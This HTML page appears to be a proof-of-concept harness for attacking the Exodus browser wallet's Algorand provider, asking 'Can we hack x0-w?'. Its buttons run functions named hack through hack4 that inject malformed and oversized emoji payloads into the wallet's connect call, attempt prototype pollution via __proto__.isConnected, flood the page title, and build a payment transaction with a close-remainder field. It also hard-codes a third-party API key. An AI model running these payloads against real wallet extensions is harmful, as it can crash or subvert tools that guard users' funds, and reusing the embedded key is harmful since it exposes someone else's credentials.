<html>
    <head>
        <title>YO</title>
        <link rel="shortcut icon" type="image/xss+svg" href="xss.svg"/>
        <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
        <script src="https://cdn.jsdelivr.net/npm/algosdk@v1.24.1/dist/browser/algosdk.min.js" integrity="sha384-cXCnQHmkjqS84S5jqAp6YXjU1ynCEJaHROHklSY7eh+cCXQ3aGX0oSgJSfQgDF5y" crossorigin="anonymous"></script>
    </head>
    <body style="background: rgb(107,231,147); background: radial-gradient(circle, rgba(110,190,200,1) 0%, rgba(150,250,250,1) 35%, rgba(50,250,5,1) 100%);">
        <script type="module">
            // PROTOTYPE POLLUTION
            //window.exodus = {}
            //window.exodus.p = {}
            //window.exodus.p["__proto__"]["isConnected"] = true

            //var payload = '\uD83D\uDC04'.repeat(10000000);
            //console.log("[*] " + payload);
            //document.title = payload;
        </script>

        <script>

            class MyEventDispatcher extends EventTarget {
                doSomething() {
                    this.dispatchEvent(new Event('ACCEPT_INCOMING_CONNECTION'));
                }
            }

            const myEventDispatcher = new MyEventDispatcher();

            function accept_connection() {
                myEventDispatcher.addEventListener('ACCEPT_INCOMING_CONNECTION', (e) => {
                    console.log('Instance fired "ACCEPT_INCOMING_CONNECTION".', e);
                });

                myEventDispatcher.doSomething();
            }


            async function transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = {
                    'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
                };
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
                const suggestedParams = await algodClient.getTransactionParams().do();
                console.log("[*] suggestedParams: ");
                console.log(suggestedParams);
                const transaction = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: window.exodus.algorand.address,
                    to: window.exodus.algorand.address,
                    closeRemainerTo: window.exodus.algorand.address,
                    amount: 1000000, // Equals 1 ALGO
                });

                const signedTransactions = await window.exodus.algorand.signTransaction([
                    transaction.toByte(),
                ]);
            }


            function prot_pollute() {
                window.exodus.p = {}
                window.exodus.p["__proto__"]["isConnected"] = true
            }

            function algo_connect() {
                console.log("[*] CONNECT")
                window.exodus.algorand.connect();
            }

            function hack() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack2() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function hack3() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack4() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function change_title() {
                var payload = '\uD83D\uDC04'.repeat(10000);
                //console.log("[*] " + payload);
                document.title = payload;
            }
        </script>


        <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
        <h1 style="color:#E00;text-shadow: 2px 2px 4px #0f0;">
        33
        </h1>
        <h2>Can we hack x0-w?</h2>
        <input type="button" value="algo_connect" onclick="algo_connect()" />
        <input type="button" value="accept_connection" onclick="accept_connection()" />
        <input type="button" value="transaction" onclick="transaction()" />
        <input type="button" value="prot_pollute" onclick="prot_pollute()" />
        <input type="button" value="hack" onclick="hack()" />
        <input type="button" value="hack2" onclick="hack2()" />
        <input type="button" value="hack3" onclick="hack3()" />
        <input type="button" value="hack4" onclick="hack4()" />
        <input type="button" value="change_title" onclick="change_title()" />
        </div>
    </body>
</html>
